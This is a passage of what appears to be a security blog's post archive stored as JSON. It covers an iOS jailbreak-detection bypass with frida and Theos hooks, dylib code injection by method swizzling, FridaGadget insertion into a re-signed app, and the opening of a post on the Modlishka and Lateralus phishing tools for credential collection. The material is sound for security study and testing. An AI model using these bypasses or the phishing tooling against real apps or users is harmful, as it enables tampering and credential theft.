directory\nerror: No such file or directory\nerror: No such file or directory\nerror: No such file or directory\nSegmentation fault (core dumped)\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThere you have it, we have really crashed our binary and in the second post I will analyze what exactly this vulnerability is and if it is really exploitable.\u003c/p\u003e\n",
                    "name": "afl_fuzzing.html"
                },
            
                {
                    "title": "Jailbreak bypass",
                    "description": "Simple jailbreak detection bypass",
                    "content": "\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eThere are thousands of posts just like this one which describes how you should approach bypassing jailbreak detection. This one isn\u0026rsquo;t different, just more step-by-step guide. We will be using \u003cem\u003efrida\u003c/em\u003e and \u003cem\u003eclass-dump\u003c/em\u003e to bypass jailbreak detection. At the end of the post, there will be short snippet how to use theos instead of frida. You should have dumped .ipa file of the application and also you need to unzip .ipa file.\u003c/p\u003e\n\n\u003ch2 id=\"information-gathering\"\u003eInformation Gathering\u003c/h2\u003e\n\n\u003cp\u003eAfter running the application, we are being presented with a sheet view that shows us a message that we can\u0026rsquo;t use the application on jailbroken device. In order to bypass this, we first need to check whether there are some methods which are doing this check.\u003c/p\u003e\n\n\u003cp\u003eAfter opening the app we are greeted with a view like the one below which translates to \u0026ldquo;\u003cem\u003eIt is not possible to use CLIENT NAME application on the devices that allows escalation of privileges to system level. For more details, please contant support.\u003c/em\u003e\u0026rdquo;\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eFirst, let\u0026rsquo;s dump the classes to see if we will find anything interesting using \u003cem\u003eclass-dump\u003c/em\u003e tool.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eNOTE:\u003c/strong\u003e\n\u003cem\u003eSubstitute word Example.app with the app you have\u003c/em\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ ~/Downloads/class-dump -S -s -H Payload/Example.app/Example -o /tmp/example_headers\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eLet\u0026rsquo;s examine these headers.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cd /tmp/example_headers\n$ ls -l | grep -iP root|jailbreak\n[ ... REDACTED ... ]\n-rw-r--r--  1 daemon1  wheel    545 Jan 26 09:26 RootCheckResult.h\n-rw-r--r--  1 daemon1  wheel    910 Jan 26 09:26 RootManagerModule.h\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe have found two interesting header files in there, \u003cem\u003eRootCheckResult.h\u003c/em\u003e and \u003cem\u003eRootManagerModule.h\u003c/em\u003e. Lets examine both and see what we will found in there.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cat RootCheckResult.h\n//\n//     Generated by class-dump 3.5 (64 bit) (Debug version compiled Sep 17 2017 16:24:48).\n//\n//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2015 by Steve Nygard.\n//\n\n#import \u0026lt;objc/NSObject.h\u0026gt;\n\n@class NSString;\n\n@interface RootCheckResult : NSObject\n{\n    _Bool _isRooted;\n    NSString *_rootCheckFailed;\n}\n\n- (void).cxx_destruct;\n- (id)init;\n@property(nonatomic) _Bool isRooted; // @synthesize isRooted=_isRooted;\n@property(retain, nonatomic) NSString *rootCheckFailed; // @synthesize rootCheckFailed=_rootCheckFailed;\n\n@end\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAnd \u003cem\u003eRootManagerModule.h\u003c/em\u003e:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cat RootManagerModule.h\n//\n//     Generated by class-dump 3.5 (64 bit) (Debug version compiled Sep 17 2017 16:24:48).\n//\n//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2015 by Steve Nygard.\n//\n\n#import \u0026lt;objc/NSObject.h\u0026gt;\n\n#import \u0026quot;RCTBridgeModule-Protocol.h\u0026quot;\n\n@class NSString, RCTBridge;\n@protocol OS_dispatch_queue;\n\n@interface RootManagerModule : NSObject \u0026lt;RCTBridgeModule\u0026gt;\n{\n}\n\n+ (void)load;\n+ (id)moduleName;\n- (_Bool)canViolateSandbox;\n- (_Bool)checkPaths;\n- (_Bool)checkSchemes;\n- (id)constantsToExport;\n- (id)isJailBroken;\n- (id)pathsToCheck;\n- (id)schemesToCheck;\n\n// Remaining properties\n@property(readonly, nonatomic) __weak RCTBridge *bridge;\n@property(readonly, copy) NSString *debugDescription;\n@property(readonly, copy) NSString *description;\n@property(readonly) unsigned long long hash;\n@property(readonly, nonatomic) NSObject\u0026lt;OS_dispatch_queue\u0026gt; *methodQueue;\n@property(readonly) Class superclass;\n\n@end\n\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that we have property called \u003cem\u003eisRooted\u003c/em\u003e inside RootCheckResult.h header file.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s write a short frida script to see when this property get\u0026rsquo;s called. I will be using my own \u003ca href=\"https://github.com/lateralusd/Helper-Scripts/blob/main/skeleton.sh\"\u003eskeleton.sh\u003c/a\u003e script to generate script for frida.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ ./skeleton.sh '-[RootCheckResult isRooted]' script.js\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eLet\u0026rsquo;s see the content of it.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cat script.js\nvar impl = ObjC.classes.RootCheckResult[\u0026quot;- isRooted\u0026quot;];\n\nInterceptor.attach(impl.implementation, {\n\tonEnter: function(args) {\n\t\tconsole.log(\u0026quot;Got called\u0026quot;);\n\t},\n\tonLeave: function(retval) {\n\t\tconsole.log(\u0026quot;Leaving function, retval is =\u0026gt; \u0026quot; + retval);\n\t}\n});\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eLet\u0026rsquo;s now run our application with frida using early instrumentation.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ frida -U -f com.echo.example -l script.js --no-pause\n     ____\n    / _  |   Frida 14.0.8 - A world-class dynamic instrumentation toolkit\n   | (_| |\n    \u0026gt; _  |   Commands:\n   /_/ |_|       help      -\u0026gt; Displays the help system\n   . . . .       object?   -\u0026gt; Display information about 'object'\n   . . . .       exit/quit -\u0026gt; Exit\n   . . . .\n   . . . .   More info at https://www.frida.re/docs/home/\nSpawned `com.echo.example`. Resuming main thread!\n[iPhone::com.echo.example]-\u0026gt; Got called\nLeaving function, retval is =\u0026gt; 0x1\n\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"bypassing\"\u003eBypassing\u003c/h2\u003e\n\n\u003cp\u003eSo we can see that our method get\u0026rsquo;s called and that is returning 0x1 as an indication that the device is jailbroken. If we overwrite the return value, we may be able to bypass the check. Our updated \u003cem\u003escript.js\u003c/em\u003e file looks like this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cat script.js\nvar impl = ObjC.classes.RootCheckResult[\u0026quot;- isRooted\u0026quot;];\n\nInterceptor.attach(impl.implementation, {\n\tonEnter: function(args) {\n\t\tconsole.log(\u0026quot;Got called\u0026quot;);\n\t},\n\tonLeave: function(retval) {\n\t\tvar newRetval = ptr(\u0026quot;0x0\u0026quot;); // Create a new variable with value 0x0\n\t\tretval.replace(newRetval);  // Replace old return value with the new one we have created\n\t\tconsole.log(\u0026quot;Leaving function, retval is =\u0026gt; \u0026quot; + retval);\n\t}\n});\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eLet\u0026rsquo;s now run it and hope for the best.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ frida -U -f com.echo.example -l script.js --no-pause \n     ____\n    / _  |   Frida 14.0.8 - A world-class dynamic instrumentation toolkit\n   | (_| |\n    \u0026gt; _  |   Commands:\n   /_/ |_|       help      -\u0026gt; Displays the help system\n   . . . .       object?   -\u0026gt; Display information about 'object'\n   . . . .       exit/quit -\u0026gt; Exit\n   . . . .\n   . . . .   More info at https://www.frida.re/docs/home/\nSpawned `com.echo.example`. Resuming main thread!\n[iPhone::com.echo.example]-\u0026gt; Got called\nLeaving function, retval is =\u0026gt; 0x0\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that we have indeed overwritten the return value and if we take a look on the application, we can see that we have bypassed it.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003ch2 id=\"theos-instead-of-frida\"\u003eTheos instead of frida\u003c/h2\u003e\n\n\u003cp\u003eFire up your \u003cem\u003enic.pl\u003c/em\u003e, select \u003cem\u003eiphone/tweak\u003c/em\u003e and choose correct bundle for your application. In order to bypass this check using Theos, my Tweak.xmfile will look like this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cat Tweak.x\n\n%hook RootCheckResult\n\n-(_Bool) isRooted {\n\treturn false;\n}\n\n%end\n\u003c/code\u003e\u003c/pre\u003e\n",
                    "name": "jailbreak_bypass.html"
                },
            
                {
                    "title": "Code injection on nonjailbroken iPhone",
                    "description": "Using custom dylib to modify applications on nonjailbroken iPhone",
                    "content": "\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eA few days ago I was writing about injecting FridaGadget.dylib inside application on nonjailbroken device so I was thinking why not to do the same thing, just with custom code (code injection).\u003c/p\u003e\n\n\u003cp\u003eThe idea was to change some functionality of original application using dynamic library (dylib). Links for application are on my github and links are below.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/lateralusd/WillGetHacked\"\u003ehttps://github.com/lateralusd/WillGetHacked\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/lateralusd/Haxor.dylib\"\u003ehttps://github.com/lateralusd/Haxor.dylib\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eLike in my previous \u003ca href=\"https://lateralusd.github.io/frida_patching/\"\u003epost\u003c/a\u003e, the same prerequsities apply.\u003c/p\u003e\n\n\u003ch2 id=\"details-about-application\"\u003eDetails about application\u003c/h2\u003e\n\n\u003cp\u003eThree important files are:\n* TestClass.h\n* TestClass.m\n* ViewController.m\u003c/p\u003e\n\n\u003cp\u003eImplementation of ViewController inside ViewController.m file can be seen below.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e@implementation ViewController\n\n- (void)viewDidLoad {\n    [super viewDidLoad];\n    NSLog(@\u0026quot;ECHO View loaded\u0026quot;);\n    TestClass *test = [[TestClass alloc] init];\n    [test whoami];\n}\n\n@end\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eInside we have a method viewDidLoad which logs \u0026ldquo;ECHO View loaded\u0026rdquo; and after that we create an object of class TestClass which is defined in TestClass.h file. Then we call method \u003cem\u003ewhoami\u003c/em\u003e on it.\u003c/p\u003e\n\n\u003cp\u003eTestClass.h file:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e@interface TestClass : NSObject\n-(void)whoami;\n@end\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eTestClass.m file:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e@implementation TestClass\n- (void)whoami {\n    NSLog(@\u0026quot;ECHO I am from the app\u0026quot;);\n}\n@end\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAfter we run the app, in logs we can see something like this.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ idevicesyslog -m ECHO\n[connected]\nDec  9 22:36:20 WillGetHacked[4272] \u0026lt;Notice\u0026gt;: ECHO View loaded\nDec  9 22:36:20 WillGetHacked[4272] \u0026lt;Notice\u0026gt;: ECHO I am from the app\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"details-about-dynamic-library\"\u003eDetails about dynamic library\u003c/h2\u003e\n\n\u003cp\u003eFor our dynamic library, we have simple interface with one instance method in it. That is the method that will replace \u003cem\u003ewhoami\u003c/em\u003e method from interface \u003cem\u003eTestClass\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eHaxor.h file:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e@interface Haxor : NSObject\n- (void)replace;\n@end\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eImplementation of this interface is where the real fun is. Let\u0026rsquo;s take a look at the code.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e#import \u0026quot;Haxor.h\u0026quot;\n#include \u0026lt;objc/runtime.h\u0026gt;\n\n@implementation Haxor\n+ (void)load{\n    NSLog(@\u0026quot;ECHO Loading Dylib\u0026quot;);\n    \n    Class thisClass = [self class];\n    Class toReplaceClass = NSClassFromString(@\u0026quot;TestClass\u0026quot;);\n    \n    SEL selReplace = @selector(replace);\n    SEL selOriginal = @selector(whoami);\n    \n    Method replaceMethod = class_getInstanceMethod(thisClass, selReplace);\n    Method originalMethod = class_getInstanceMethod(toReplaceClass, selOriginal);\n    \n    IMP impReplace = method_getImplementation(replaceMethod);\n    \n    method_setImplementation(originalMethod, impReplace);\n}\n\n- (void)replace{\n    NSLog(@\u0026quot;ECHO I am from the dylib\u0026quot;);\n}\n@end\n\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"explanation\"\u003eExplanation\u003c/h2\u003e\n\n\u003cp\u003eWe will use what is called method swizzling. It basically uses power of objective c runtime to modify application.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003eClass thisClass = [self class];\nClass toReplaceClass = NSClassFromString(@\u0026quot;TestClass\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eHere we are taking Class objects from classes which have methods we would like to replace. In this case, we have method -[thisDylib replace] and method -[TestClass whoami]. Since we are in Haxor we can use \u003ccode\u003e[self class]\u003c/code\u003e to get it\u0026rsquo;s class method. To obtain Class for the one we would like to replace, we call function \u003ccode\u003eNSClassFromString\u003c/code\u003e function which accepts NSString as class name and returns Class object for that class.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003eSEL selReplace = @selector(replace);\nSEL selOriginal = @selector(whoami);\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe are creating selector variables of methods we are gonna substitute.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003eMethod replaceMethod = class_getInstanceMethod(thisClass, selReplace);\nMethod originalMethod = class_getInstanceMethod(toReplaceClass, selOriginal);\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e\u003ccode\u003eclass_getInstanceMethod\u003c/code\u003e returns to us Method object of instance methods which we want. \u003ccode\u003ereplaceMethod\u003c/code\u003e will basically have -[Haxor replace] as a Method object, while \u003ccode\u003eoriginalMethod\u003c/code\u003e will have -[TestClass whoami].\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003eIMP impReplace = method_getImplementation(replaceMethod);\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e\u003ccode\u003eimpReplace\u003c/code\u003e will have implementation of replaceMethod, or -[Haxor replace].\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003emethod_setImplementation(originalMethod, impReplace);\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThis is the last step, we are setting implementation of -[TestClass whoami] to be the same as -[Haxor replace].\u003c/p\u003e\n\n\u003ch2 id=\"creating-ipa-and-installing-it\"\u003eCreating ipa and installing it\u003c/h2\u003e\n\n\u003cp\u003eThe process is similar to the one we did last time.\u003c/p\u003e\n\n\u003cp\u003eSince Haxor is a static library (.a extension), we will first convert it to dynamic library (dylib) so we can inject it the same way we did with out FridaGadget.dylib.\u003c/p\u003e\n\n\u003cp\u003eMy library is called libHaxor.a, so to convert it to dylib we use:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e$ xcrun --sdk iphoneos clang -arch arm64 -shared -all_load -o Haxor.dylib libHaxor.a\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eMake sure to replace \u003ccode\u003e-arch\u003c/code\u003e parameter with the architecture of your device.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s create Payload directory and copy our newly created dylib and app inside of it.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eNOTE: You need to have valid provisioning profile in order to sign the app\u003c/strong\u003e\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ mkdir Payload/\n$ cp -r WillGetHacked.app Payload/\n$ cp Haxor.dylib Payload/WillGetHacked.app/\n$ tree\n.\n Haxor.dylib\n Payload\n  WillGetHacked.app\n      Base.lproj\n       LaunchScreen.storyboardc\n        01J-lp-oVM-view-Ze5-6b-2t3.nib\n        Info.plist\n        UIViewController-01J-lp-oVM.nib\n       Main.storyboardc\n           BYZ-38-t0r-view-8bC-Xf-vdC.nib\n           Info.plist\n           UIViewController-BYZ-38-t0r.nib\n      Haxor.dylib\n      Info.plist\n      PkgInfo\n      WillGetHacked\n      _CodeSignature\n       CodeResources\n      embedded.mobileprovision\n embedded.mobileprovision\n libHaxor.a\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eNow we need to insert our Haxor.dylib inside binary and add rpath so binary knows where to search for dylibs.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ insert_dylib --strip-codesig --inplace @executable_path/Haxor.dylib Payload/WillGetHacked.app/WillGetHacked\nAdded LC_LOAD_DYLIB to Payload/WillGetHacked.app/WillGetHacked\n$ install_name_tool -add_rpath @executable_path/. Payload/WillGetHacked.app/WillGetHacked\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eCopy your provisioning profile in the same directory where Payload/ directory is and run:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ zip -qry hacked.ipa Payload/\n$ applesign -m ./embedded.mobileprovision hacked.ipa\n[ ... REDACTED ... ]\nTarget is now signed: hacked-resigned.ipa\nCleaning up /Users/daemon1/injection/hacked.ipa.f3b6be03-336c-44d7-8537-d96cf8281d2b\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eInstalling on the device using \u003ccode\u003eideviceinstaller\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e$ ideviceinstaller -i hacked-resigned.ipa\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eIf everything is done correctly, application will get installed. Now if we check syslog, we will see that our dylib successfuly substituted method.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ idevicesyslog -m ECHO\nDec  9 22:49:17 WillGetHacked(Haxor.dylib)[4302] \u0026lt;Notice\u0026gt;: ECHO Loading Dylib\nDec  9 22:49:17 WillGetHacked[4302] \u0026lt;Notice\u0026gt;: ECHO View loaded\nDec  9 22:49:17 WillGetHacked(Haxor.dylib)[4302] \u0026lt;Notice\u0026gt;: ECHO I am from the dylib\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can expand this even more, we can also add our custom methods to classes or perhaps calling original method after substituted one gets called.\u003c/p\u003e\n",
                    "name": "theos_like.html"
                },
            
                {
                    "title": "FridaGadget.dylib on nonjailbroken iPhone",
                    "description": "Finally got it",
                    "content": "\u003ch1 id=\"table-of-contents\"\u003eTable of Contents\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#prerequisities\"\u003ePrerequisities\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#preparation\"\u003ePreparation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#patching-the-application\"\u003ePatching the application\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#signing-application\"\u003eSigning application\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eAfter trying for 7.30 hours to insert FridaGadget into the application, I have finally did it. It took reading bunch of tutorials and trials until it all clicked.\u003c/p\u003e\n\n\u003cp\u003eAnyway, FridaGadget allows us instrumentation (lets say hacking) of an application on non jailbroken iPhone. I was using my iPhone which is running iOS 14.0.1.\u003c/p\u003e\n\n\u003ch2 id=\"prerequisities\"\u003ePrerequisities\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/frida/frida/releases/tag/14.1.2\"\u003eFrida Gadget\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Tyilo/insert_dylib\"\u003einsert_dylib\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/nowsecure/node-applesign\"\u003eapplesign\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ios-control/ios-deploy\"\u003eios-deploy\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/frida/frida\"\u003eFrida\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"preparation\"\u003ePreparation\u003c/h2\u003e\n\n\u003cp\u003eThe first thing you need it to get provisioning profile, or let\u0026rsquo;s call it your certificate which will be used to sign an application. To do this, create an empty project, give it a name, a \u003cstrong\u003eremember\u003c/strong\u003e its bundle identifier. After that, build an app and in the XCode under the Project Navigator, you should see directory \u003cem\u003eProducts\u003c/em\u003e and in it .app file.\u003c/p\u003e\n\n\u003cp\u003eRight click on the .app file and click on \u003cem\u003eShow in Finder\u003c/em\u003e. After the new Finder window opens, right click on an app and choose \u003cem\u003eShow Package Contents\u003c/em\u003e. Copy file \u003cstrong\u003eembedded.mobileprovision\u003c/strong\u003e file on some location on your system, lets say \u003cem\u003e/tmp/\u003c/em\u003e directory.\u003cbr\u003e\n\u003ccode\u003e$ cp embedded.mobileprovision /tmp\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"patching-the-application\"\u003ePatching the application\u003c/h2\u003e\n\n\u003cp\u003eFirst download the gadget from the site given in the prerequisites section. After you have done that, copy .ipa file, embedded.mobileprovision and frida gadget to the same directory, like in an example below.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ tree /tmp/patchingIPA/\n.\n FridaGadget.dylib\n embedded.mobileprovision\n testApp.ipa\n\n0 directories, 3 files\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eUnzip the .ipa file and copy FridaGadget.dylib inside it.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003eArchive:  testApp.ipa\n   creating: Payload/\n   creating: Payload/testApp.app/\n   creating: Payload/testApp.app/_CodeSignature/\n  inflating: Payload/testApp.app/_CodeSignature/CodeResources\n   creating: Payload/testApp.app/Base.lproj/\n   creating: Payload/testApp.app/Base.lproj/Main.storyboardc/\n  inflating: Payload/testApp.app/Base.lproj/Main.storyboardc/UIViewController-BYZ-38-t0r.nib\n  inflating: Payload/testApp.app/Base.lproj/Main.storyboardc/BYZ-38-t0r-view-8bC-Xf-vdC.nib\n  inflating: Payload/testApp.app/Base.lproj/Main.storyboardc/Info.plist\n   creating: Payload/testApp.app/Base.lproj/LaunchScreen.storyboardc/\n  inflating: Payload/testApp.app/Base.lproj/LaunchScreen.storyboardc/01J-lp-oVM-view-Ze5-6b-2t3.nib\n  inflating: Payload/testApp.app/Base.lproj/LaunchScreen.storyboardc/UIViewController-01J-lp-oVM.nib\n  inflating: Payload/testApp.app/Base.lproj/LaunchScreen.storyboardc/Info.plist\n  inflating: Payload/testApp.app/embedded.mobileprovision\n  inflating: Payload/testApp.app/testApp\n  inflating: Payload/testApp.app/Info.plist\n extracting: Payload/testApp.app/PkgInfo\n$ cp FridaGadget.dylib Payload/testApp.app/\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eNow we need to tell our binary to load this FridaGadget.dylib, we do that using \u003ccode\u003einsert_dylib\u003c/code\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ insert_dylib --strip-codesig --inplace @executable_path/FridaGadget.dylib Payload/testApp.app/testApp\nAdded LC_LOAD_DYLIB to Payload/testApp.app/testApp\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThere is one more thing left before packaging our app and deploying it, and that is telling our binary where to search for dylibs. In rescue comes \u003ccode\u003einstall_name_tool\u003c/code\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ install_name_tool -add_rpath @executable_path/. Payload/testApp.app/testApp\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"signing-application\"\u003eSigning application\u003c/h2\u003e\n\n\u003cp\u003eFor signing, we will use applesign. The first thing we need to do is package our Payload/ directory into new app.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e$ zip -qry patched.ipa Payload/\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eNow we run applesign on it using our embedded.mobileprovision file and passing the bundle identifier which we setup during creation of our test app. In my case it was com.delorean.test.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ applesign --mobileprovision ./embedded.mobileprovision --bundleid com.delorean.test patched.ipa\nFile: /private/tmp/testApp/test/patchingIPA/patched.ipa\n[ ... REDACTED ... ]\nTarget is now signed: patched-resigned.ipa\nCleaning up /private/tmp/testApp/test/patchingIPA/patched.ipa.afdd2d36-e576-42b4-beaa-b1a3f9eec14e\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAs applesign says, our signed app is now inside \u003cem\u003epatched-resigned.ipa\u003c/em\u003e. We are gonna create a new directory, copy our new resigned app in it, unzip it and deploy it to our device.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ mkdir test\n$ cp patched-resigned.ipa test \u0026amp;\u0026amp; cd test\n$ unzip patched-resigned.ipa\nArchive:  patched-resigned.ipa\n   creating: Payload/\n   creating: Payload/testApp.app/\n   creating: Payload/testApp.app/_CodeSignature/\n\t[ ... REDACTED ... ]\n$ ideviceinstaller -i patched-resigned.ipa\nWARNING: could not locate iTunesMetadata.plist in archive!\nWARNING: could not locate Payload/testApp.app/SC_Info/testApp.sinf in archive!\nCopying 'patched-resigned.ipa' to device... DONE.\nInstalling 'com.delorean.test'\nInstall: CreatingStagingDirectory (5%)\nInstall: ExtractingPackage (15%)\nInstall: InspectingPackage (20%)\nInstall: TakingInstallLock (20%)\nInstall: PreflightingApplication (30%)\nInstall: InstallingEmbeddedProfile (30%)\nInstall: VerifyingApplication (40%)\nInstall: CreatingContainer (50%)\nInstall: InstallingApplication (60%)\nInstall: PostflightingApplication (70%)\nInstall: SandboxingApplication (80%)\nInstall: GeneratingApplicationMap (90%)\nInstall: Complete\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWhen you click on app, it will say that it is Untrusted Developer, go to the Settings -\u0026gt; General -\u0026gt; Profile \u0026amp; Device Management, choose developer and trust it.\u003c/p\u003e\n\n\u003cp\u003eAfter you have done that, run ios-deploy.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ ios-deploy --bundle Payload/testApp.app/ -W -d\n[ ... REDACTED ...]\n(lldb)     connect\n(lldb)     run\nsuccess\n2020-12-05 23:13:03.221242+0100 testApp[668:64572] Frida: Listening on 127.0.0.1 TCP port 27042\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eIn other window, run \u003ccode\u003e$ frida-ps -U | grep -i gadget\u003c/code\u003e. If everything is done correctly, you should see it in the listing and you can connect to it and hack the hell out of it.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ frida-ps -U | grep -i gadget\n668  Gadget\n$ frida -U Gadget\n     ____\n    / _  |   Frida 14.0.8 - A world-class dynamic instrumentation toolkit\n   | (_| |\n    \u0026gt; _  |   Commands:\n   /_/ |_|       help      -\u0026gt; Displays the help system\n   . . . .       object?   -\u0026gt; Display information about 'object'\n   . . . .       exit/quit -\u0026gt; Exit\n   . . . .\n   . . . .   More info at https://www.frida.re/docs/home/\n\u003c/code\u003e\u003c/pre\u003e\n",
                    "name": "frida_patching.html"
                },
            
                {
                    "title": "Modlishka \u0026 Lateralus",
                    "description": "Strange words",
                    "content": "\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eLet\u0026rsquo;s first start by giving description of Modlishka and lateralus.\u003c/p\u003e\n\n\u003ch3 id=\"modlishka\"\u003eModlishka\u003c/h3\u003e\n\n\u003cp\u003e\u003ca href=\"https://github.com/drk1wi/Modlishka\"\u003eModlishka\u003c/a\u003e is basically a reverse proxy which can be used to bypass 2FA, collect credentials and generally is helpful for phishing campaigns.\u003cbr\u003e\nIt has a lot of options, such as:\u003cbr\u003e\n* Injecting custom javascript code (can be useful to rewrite parts of page)\n* Substitutions of strings\n* Credentials collection\n* Domain mode hijacking\u003c/p\u003e\n\n\u003cp\u003eHere I will show only some parts of it, you should download it and give it a try.\u003c/p\u003e\n\n\u003ch3 id=\"lateralus\"\u003eLateralus\u003c/h3\u003e\n\n\u003cp\u003e\u003ca href=\"https://github.com/lateralusd/lateralus\"\u003eLateralus\u003c/a\u003e is a tool I have built specifically for phishing campaigns. It allows you to create email template, select targets, generate urls and correlate data with control db file of Modlishka. It is written in the same language as Modlishka, Golang, and as such it is easy to understand how it works.\u003c/p\u003e\n\n\u003ch2 id=\"goal\"\u003eGoal\u003c/h2\u003e\n\n\u003cp\u003eThe goal is to collect credentials from out target, as a target site we will choose example.com.\u003c/p\u003e\n\n\u003ch2 